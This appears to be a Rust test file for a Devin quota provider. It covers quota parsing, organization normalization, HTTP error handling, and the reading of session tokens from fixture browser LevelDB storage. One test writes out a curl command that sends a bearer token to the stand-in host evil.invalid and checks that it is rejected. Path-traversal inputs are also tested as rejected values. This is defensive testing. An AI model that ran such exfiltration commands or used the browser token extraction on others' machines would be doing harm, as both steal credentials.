use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use oab_domain::{AccountKey, AccountScope, ErrorKind, ProviderId, ProviderInstanceId, Timestamp};
use oab_providers::browser_profile::{
    BrowserProfileDiscovery, BrowserProfileRoots, FlatpakProfileDiscovery,
};
use oab_providers::context::ProviderContext;
use oab_providers::descriptor::ProviderSource;
use oab_providers::endpoint::EndpointClass;
use oab_providers::providers::devin::{
    DevinProvider, normalize_organization, parse_quota_response,
};
use oab_test_support::http::{FakeHttpResponse, FakeHttpServer};
use rust_decimal::Decimal;
use tokio_util::sync::CancellationToken;

const CURRENT: &[u8] = include_bytes!("../../../fixtures/providers/devin/quota-current.json");
const FALLBACK: &[u8] = include_bytes!("../../../fixtures/providers/devin/quota-fallback.json");
const TOKEN_A: &str = "auth1_abcdefghijklmnopqrstuvwxyz0123456789";
const TOKEN_B: &str = "auth1_zyxwvutsrqponmlkjihgfedcba9876543210";
const INTERNAL_ORG: &str = "org_GQ6LhcfkW1TSinM6";
const NOW_SECONDS: i64 = 1_780_000_000;

static NEXT_TEMP: AtomicU64 = AtomicU64::new(0);

struct TestDirectory(PathBuf);

impl TestDirectory {
    fn new() -> Self {
        let id = NEXT_TEMP.fetch_add(1, Ordering::Relaxed);
        let path =
            std::env::temp_dir().join(format!("omarchy-ai-bar-devin-{}-{id}", std::process::id()));
        fs::create_dir(&path).expect("create Devin fixture root");
        Self(path)
    }

    fn directory(&self, relative: impl AsRef<Path>) -> PathBuf {
        let path = self.0.join(relative);
        fs::create_dir_all(&path).expect("create Devin fixture directory");
        path
    }

    fn write(&self, relative: impl AsRef<Path>, bytes: impl AsRef<[u8]>) {
        let path = self.0.join(relative);
        fs::create_dir_all(path.parent().expect("fixture parent")).expect("create fixture parent");
        fs::write(path, bytes).expect("write Devin fixture");
    }
}

impl Drop for TestDirectory {
    fn drop(&mut self) {
        let _ignored = fs::remove_dir_all(&self.0);
    }
}

fn timestamp(seconds: i64) -> Timestamp {
    Timestamp::from_unix_timestamp(seconds).expect("fixture timestamp")
}

fn scope(account: &str) -> AccountScope {
    AccountScope::new(
        ProviderId::Devin,
        ProviderInstanceId::new("devin-primary").expect("provider instance"),
        AccountKey::new(account).expect("account key"),
    )
}

fn context(account: &str, source: ProviderSource) -> ProviderContext {
    ProviderContext::new(scope(account), source, CancellationToken::new())
}

fn assert_percent(actual: f64, expected: f64) {
    assert!(
        (actual - expected).abs() < f64::EPSILON,
        "{actual} != {expected}"
    );
}

#[test]
fn golden_current_quota_maps_windows_identity_plan_and_extra_balance() {
    let sample = parse_quota_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        CURRENT,
        Some("org/example-org"),
        ProviderSource::ManualCookie,
    )
    .expect("current quota fixture");

    let daily = sample.primary().expect("daily quota");
    let weekly = sample.secondary().expect("weekly quota");
    assert_percent(daily.used_percent().expect("daily percent").get(), 12.0);
    assert_percent(weekly.used_percent().expect("weekly percent").get(), 42.0);
    assert_eq!(daily.duration().expect("daily duration").seconds(), 86_400);
    assert_eq!(
        weekly.duration().expect("weekly duration").seconds(),
        604_800
    );
    assert_eq!(
        daily.resets_at().expect("daily reset").unix_timestamp(),
        1_781_164_800
    );
    assert_eq!(
        weekly.resets_at().expect("weekly reset").unix_timestamp(),
        1_781_424_000
    );
    assert_eq!(
        sample
            .identity()
            .organization()
            .expect("organization")
            .as_str(),
        "example-org"
    );
    assert_eq!(
        sample.identity().login_method().expect("plan").as_str(),
        "Pro"
    );
    let cost = sample.cost().expect("extra usage balance");
    assert_eq!(cost.used().amount().get(), Decimal::new(7_087, 2));
    assert_eq!(cost.limit().get(), Decimal::ZERO);
    assert_eq!(cost.period(), Some("Extra usage balance"));
}

#[test]
fn golden_fallback_quota_preserves_baseline_percentage_and_reset_rules() {
    let sample = parse_quota_response(
        scope("account-a"),
        timestamp(NOW_SECONDS),
        FALLBACK,
        Some("organizations/org_internal"),
        ProviderSource::BrowserSession,
    )
    .expect("fallback quota fixture");
    assert_percent(
        sample
            .primary()
            .expect("daily")
            .used_percent()
            .expect("percent")
            .get(),
        30.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("percent")
            .get(),
        75.0,
    );
    assert_eq!(
        sample.identity().login_method().expect("plan").as_str(),
        "Team Plan"
    );
    assert_eq!(
        sample
            .identity()
            .organization()
            .expect("organization")
            .as_str(),
        "org_internal"
    );
}

#[test]
fn boundary_percentages_weekly_only_and_bounds_match_pinned_behavior() {
    let body = br#"{"daily_percentage":1,"weekly_percentage":0.5}"#;
    let sample = parse_quota_response(
        scope("a"),
        timestamp(NOW_SECONDS),
        body,
        None,
        ProviderSource::ManualCookie,
    )
    .expect("current percentages");
    assert_percent(
        sample
            .primary()
            .expect("daily")
            .used_percent()
            .expect("known")
            .get(),
        1.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("known")
            .get(),
        50.0,
    );

    let fallback = br#"{"quota":{"daily":{"used_percent":1},"weekly":{"remaining_percent":1}}}"#;
    let sample = parse_quota_response(
        scope("a"),
        timestamp(NOW_SECONDS),
        fallback,
        None,
        ProviderSource::ManualCookie,
    )
    .expect("fallback percentages");
    assert_percent(
        sample
            .primary()
            .expect("daily")
            .used_percent()
            .expect("known")
            .get(),
        100.0,
    );
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("known")
            .get(),
        0.0,
    );

    let weekly = br#"{"hide_daily_quota":true,"weekly_percentage":25}"#;
    let sample = parse_quota_response(
        scope("a"),
        timestamp(NOW_SECONDS),
        weekly,
        None,
        ProviderSource::ManualCookie,
    )
    .expect("weekly only");
    assert!(sample.primary().is_none());
    assert_percent(
        sample
            .secondary()
            .expect("weekly")
            .used_percent()
            .expect("known")
            .get(),
        25.0,
    );

    let deep = format!("{}0{}", "[".repeat(50), "]".repeat(50));
    assert_eq!(
        parse_quota_response(
            scope("a"),
            timestamp(NOW_SECONDS),
            deep.as_bytes(),
            None,
            ProviderSource::ManualCookie,
        )
        .expect_err("deep JSON")
        .kind(),
        ErrorKind::Parse
    );
}

#[test]
fn organization_normalization_is_exact_and_rejects_unsafe_path_material() {
    assert_eq!(
        normalize_organization("example-org"),
        Some("org/example-org".to_owned())
    );
    assert_eq!(
        normalize_organization("org/example-org"),
        Some("org/example-org".to_owned())
    );
    assert_eq!(
        normalize_organization(INTERNAL_ORG),
        Some(format!("organizations/{INTERNAL_ORG}"))
    );
    assert_eq!(
        normalize_organization("https://app.devin.ai/org/example-org/settings/usage"),
        Some("org/example-org".to_owned())
    );
    assert_eq!(
        normalize_organization("https://evil.invalid/org/example"),
        None
    );
    assert_eq!(normalize_organization("org/../../escape"), None);
    assert_eq!(normalize_organization("org/line\nbreak"), None);
}

#[tokio::test]
async fn manual_forms_are_equivalent_and_curl_authority_cannot_exfiltrate() {
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(200, CURRENT.to_vec()),
        FakeHttpResponse::new(200, CURRENT.to_vec()),
        FakeHttpResponse::new(200, CURRENT.to_vec()),
        FakeHttpResponse::new(200, CURRENT.to_vec()),
    ])
    .await;
    let forms = [
        TOKEN_A.to_owned(),
        format!("Bearer {TOKEN_A}"),
        format!("Authorization: Bearer {TOKEN_A}"),
        format!(
            "curl 'https://app.devin.ai/api/org/example/billing/quota/usage' -H 'Authorization: Bearer {TOKEN_A}'"
        ),
    ];
    for form in forms {
        let provider = DevinProvider::from_manual_capture_at(
            scope("account-a"),
            &form,
            Some("example"),
            &server.url("/"),
            EndpointClass::LoopbackDevelopment,
        )
        .expect("accepted manual form");
        provider
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("manual form fetch");
        assert!(!format!("{provider:?}").contains(TOKEN_A));
    }
    assert_eq!(server.requests().len(), 4);

    let exfiltration = format!(
        "curl 'https://evil.invalid/api/org/example/billing/quota/usage' -H 'Authorization: Bearer {TOKEN_A}'"
    );
    let error = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        &exfiltration,
        Some("example"),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect_err("captured host is not authorized");
    assert_eq!(error.kind(), ErrorKind::Parse);
    assert!(!format!("{error:?}").contains(TOKEN_A));

    let foreign = url::Url::parse("https://example.com/").expect("foreign URL");
    let error = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        TOKEN_A,
        Some("example"),
        &foreign,
        EndpointClass::PublicHttps,
    )
    .expect_err("production endpoint is fixed");
    assert_eq!(error.kind(), ErrorKind::Api);
}

#[tokio::test]
async fn manual_fetch_uses_exact_paths_headers_and_stops_on_successful_parse_failure() {
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(404, b"not found".to_vec()),
        FakeHttpResponse::new(200, b"{}".to_vec()),
        FakeHttpResponse::new(200, CURRENT.to_vec()),
    ])
    .await;
    let provider = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        "Authorization: Bearer manual-secret-canary",
        Some("example-org"),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("manual provider");
    let error = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("successful malformed response is terminal");
    assert_eq!(error.kind(), ErrorKind::Parse);

    let requests = server.requests();
    assert_eq!(requests.len(), 2);
    assert_eq!(requests[0].method(), "GET");
    assert_eq!(
        requests[0].target(),
        "/api/org/example-org/billing/quota/usage"
    );
    assert_eq!(requests[1].target(), "/api/example-org/billing/quota/usage");
    for request in requests {
        assert_eq!(
            request.header("authorization"),
            Some("Bearer manual-secret-canary")
        );
        assert_eq!(request.header("accept"), Some("application/json"));
        assert_eq!(request.header("accept-language"), Some("en-US,en;q=0.9"));
        assert!(
            request
                .header("user-agent")
                .is_some_and(|value| value.contains("Chrome/143.0.0.0"))
        );
        assert!(request.header("x-cog-org-id").is_none());
        assert!(request.body().is_empty());
    }
}

#[tokio::test]
async fn internal_organization_candidates_and_auth_status_are_isolated() {
    let server = FakeHttpServer::start([FakeHttpResponse::new(403, Vec::new())]).await;
    let provider = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        TOKEN_A,
        Some(INTERNAL_ORG),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("manual provider");
    let error = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("forbidden credential");
    assert_eq!(error.kind(), ErrorKind::AuthenticationExpired);
    let request = server.requests().first().cloned().expect("one request");
    assert_eq!(
        request.target(),
        format!("/api/{INTERNAL_ORG}/billing/quota/usage")
    );
    assert_eq!(request.header("x-cog-org-id"), Some(INTERNAL_ORG));

    let wrong_account = provider
        .fetch_at(
            &context("account-b", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("account isolation");
    assert_eq!(wrong_account.kind(), ErrorKind::Api);
    let wrong_source = provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("source isolation");
    assert_eq!(wrong_source.kind(), ErrorKind::Api);
}

#[tokio::test]
async fn network_status_redirect_truncation_and_cancellation_are_classified() {
    for (response, expected) in [
        (FakeHttpResponse::new(201, CURRENT.to_vec()), ErrorKind::Api),
        (
            FakeHttpResponse::new(429, Vec::new()),
            ErrorKind::RateLimited,
        ),
        (
            FakeHttpResponse::new(503, Vec::new()),
            ErrorKind::ProviderUnavailable,
        ),
        (
            FakeHttpResponse::new(302, Vec::new()).header("Location", "/elsewhere"),
            ErrorKind::Parse,
        ),
        (
            FakeHttpResponse::truncated(200, 100, b"{}".to_vec()),
            ErrorKind::Parse,
        ),
    ] {
        let server = FakeHttpServer::start([response.clone(), response]).await;
        let provider = DevinProvider::from_manual_capture_at(
            scope("account-a"),
            TOKEN_A,
            Some("example"),
            &server.url("/"),
            EndpointClass::LoopbackDevelopment,
        )
        .expect("manual provider");
        let error = provider
            .fetch_at(
                &context("account-a", ProviderSource::ManualCookie),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect_err("classified transport failure");
        assert_eq!(error.kind(), expected);
    }

    let server = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let provider = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        TOKEN_A,
        Some("example"),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("manual provider");
    let cancellation = CancellationToken::new();
    cancellation.cancel();
    let cancelled = ProviderContext::new(
        scope("account-a"),
        ProviderSource::ManualCookie,
        cancellation,
    );
    let error = tokio::time::timeout(
        Duration::from_secs(1),
        provider.fetch_at(&cancelled, timestamp(NOW_SECONDS)),
    )
    .await
    .expect("cancellation is prompt")
    .expect_err("cancelled fetch");
    assert_eq!(error.kind(), ErrorKind::Network);

    let oversized = vec![b'x'; 2 * 1024 * 1024 + 1];
    let response = FakeHttpResponse::new(200, oversized);
    let server = FakeHttpServer::start([response.clone(), response]).await;
    let provider = DevinProvider::from_manual_capture_at(
        scope("account-a"),
        TOKEN_A,
        Some("example"),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("manual provider");
    let error = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("oversized response");
    assert_eq!(error.kind(), ErrorKind::Parse);
}

#[tokio::test]
async fn browser_leveldb_sessions_are_ranked_deduplicated_and_fall_back_on_auth() {
    let fixture = TestDirectory::new();
    let home = fixture.directory("home");
    let config = fixture.directory("home/config");
    write_profile_storage(
        &fixture,
        "home/config/chromium/Default",
        &[("auth1_session", format!(r#"{{"token":"{TOKEN_A}"}}"#))],
    );
    write_profile_storage(
        &fixture,
        "home/config/google-chrome/Default",
        &[
            ("auth1_session", format!(r#"{{"token":"{TOKEN_B}"}}"#)),
            (
                "last-internal-org-for-external-org-v1-example-org",
                format!(r#""{INTERNAL_ORG}""#),
            ),
        ],
    );
    write_profile_storage(
        &fixture,
        "home/config/BraveSoftware/Brave-Browser/Default",
        &[("auth1_session", format!(r#"{{"token":"{TOKEN_A}"}}"#))],
    );
    let roots = BrowserProfileRoots::new(home, config, None::<&Path>).expect("browser roots");
    let discovery = BrowserProfileDiscovery::with_roots(roots);
    let server = FakeHttpServer::start([
        FakeHttpResponse::new(401, Vec::new()),
        FakeHttpResponse::new(200, CURRENT.to_vec()),
    ])
    .await;
    let provider = DevinProvider::from_browser_discovery_at(
        scope("account-a"),
        &discovery,
        Some("example-org"),
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("browser provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("browser fallback");
    assert_percent(
        sample
            .primary()
            .expect("daily")
            .used_percent()
            .expect("known")
            .get(),
        12.0,
    );
    let requests = server.requests();
    assert_eq!(requests.len(), 2);
    let expected_b = format!("Bearer {TOKEN_B}");
    assert_eq!(
        requests[0].header("authorization"),
        Some(expected_b.as_str())
    );
    assert_eq!(requests[0].header("x-cog-org-id"), Some(INTERNAL_ORG));
    let expected_a = format!("Bearer {TOKEN_A}");
    assert_eq!(
        requests[1].header("authorization"),
        Some(expected_a.as_str())
    );
}

#[tokio::test]
async fn edge_auth0_session_infers_organization_from_member_storage() {
    let fixture = TestDirectory::new();
    let home = fixture.directory("home");
    let config = fixture.directory("home/config");
    let auth0_token = "eyJhbGciOiJub25lIn0.eyJpc3MiOiJodHRwczovL2F1dGguZGV2aW4uYWkvIn0.signature";
    write_profile_storage(
        &fixture,
        "home/config/microsoft-edge/Default",
        &[
            ("aaa-auth1_session", "{malformed".to_owned()),
            (
                "@@auth0spajs@@::client::audience::scope",
                format!(r#"{{"body":{{"access_token":"{auth0_token}"}}}}"#),
            ),
            (
                "member-info-v1-org-github|123",
                format!(r#"{{"value":{{"org_id":"{INTERNAL_ORG}","org_name":"edge-org"}}}}"#),
            ),
        ],
    );
    let roots = BrowserProfileRoots::new(home, config, None::<&Path>).expect("browser roots");
    let discovery = BrowserProfileDiscovery::with_roots(roots);
    let server = FakeHttpServer::start([FakeHttpResponse::new(200, CURRENT.to_vec())]).await;
    let provider = DevinProvider::from_browser_discovery_at(
        scope("account-a"),
        &discovery,
        None,
        &server.url("/"),
        EndpointClass::LoopbackDevelopment,
    )
    .expect("Edge browser provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("Edge session fetch");
    assert_eq!(
        sample
            .identity()
            .organization()
            .expect("organization")
            .as_str(),
        "edge-org"
    );
    let request = server.requests().first().cloned().expect("request");
    assert_eq!(
        request.target(),
        format!("/api/{INTERNAL_ORG}/billing/quota/usage")
    );
    assert_eq!(request.header("x-cog-org-id"), Some(INTERNAL_ORG));
    let expected = format!("Bearer {auth0_token}");
    assert_eq!(request.header("authorization"), Some(expected.as_str()));
}

#[test]
fn disabled_browser_discovery_is_nonprobing_and_missing_credentials_are_redacted() {
    let error = DevinProvider::new_browser(scope("a"), &BrowserProfileDiscovery::disabled(), None)
        .expect_err("disabled discovery");
    assert_eq!(error.kind(), ErrorKind::MissingCredential);

    let raw = "Authorization: Bearer highly-sensitive-devin-token";
    let error = DevinProvider::new_manual(scope("a"), raw, Some("org/../../bad"))
        .expect_err("invalid organization");
    assert_eq!(error.kind(), ErrorKind::Api);
    assert!(!format!("{error:?}").contains("highly-sensitive"));

    let mut environment = BTreeMap::new();
    environment.insert("HOME".to_owned(), "/definitely/not/a/live/home".to_owned());
    let discovery = BrowserProfileDiscovery::enabled_from_environment(
        &environment,
        FlatpakProfileDiscovery::Disabled,
    )
    .expect("injected environment");
    assert!(discovery.discover().is_empty());
}

fn write_profile_storage(fixture: &TestDirectory, profile: &str, entries: &[(&str, String)]) {
    let leveldb = format!("{profile}/Local Storage/leveldb");
    fixture.directory(&leveldb);
    let operations = entries
        .iter()
        .map(|(key, value)| {
            let mut local_key = b"_https://app.devin.ai\0\x01".to_vec();
            local_key.extend_from_slice(key.as_bytes());
            let mut local_value = vec![1];
            local_value.extend_from_slice(value.as_bytes());
            (local_key, local_value)
        })
        .collect::<Vec<_>>();
    let batch = write_batch(1, &operations);
    fixture.write(format!("{leveldb}/000001.log"), physical_record(1, &batch));
}

fn write_batch(sequence: u64, operations: &[(Vec<u8>, Vec<u8>)]) -> Vec<u8> {
    let mut output = Vec::new();
    output.extend_from_slice(&sequence.to_le_bytes());
    output.extend_from_slice(
        &u32::try_from(operations.len())
            .expect("fixture operation count")
            .to_le_bytes(),
    );
    for (key, value) in operations {
        output.push(1);
        put_slice(&mut output, key);
        put_slice(&mut output, value);
    }
    output
}

fn put_slice(output: &mut Vec<u8>, value: &[u8]) {
    put_varint(output, u64::try_from(value.len()).expect("fixture length"));
    output.extend_from_slice(value);
}

fn put_varint(output: &mut Vec<u8>, mut value: u64) {
    while value >= 0x80 {
        output.push(u8::try_from(value & 0x7f).expect("varint byte") | 0x80);
        value >>= 7;
    }
    output.push(u8::try_from(value).expect("final varint byte"));
}

fn physical_record(record_type: u8, payload: &[u8]) -> Vec<u8> {
    let mut output = Vec::new();
    output.extend_from_slice(&masked_crc32c(record_type, payload).to_le_bytes());
    output.extend_from_slice(
        &u16::try_from(payload.len())
            .expect("fixture record length")
            .to_le_bytes(),
    );
    output.push(record_type);
    output.extend_from_slice(payload);
    output
}

fn masked_crc32c(record_type: u8, payload: &[u8]) -> u32 {
    let crc = crc32c_extend(crc32c_extend(!0_u32, &[record_type]), payload);
    let crc = !crc;
    crc.rotate_right(15).wrapping_add(0xa282_ead8)
}

fn crc32c_extend(mut crc: u32, bytes: &[u8]) -> u32 {
    for byte in bytes {
        crc ^= u32::from(*byte);
        for _ in 0..8 {
            crc = (crc >> 1) ^ (0x82f6_3b78_u32 & (0_u32.wrapping_sub(crc & 1)));
        }
    }
    crc
}
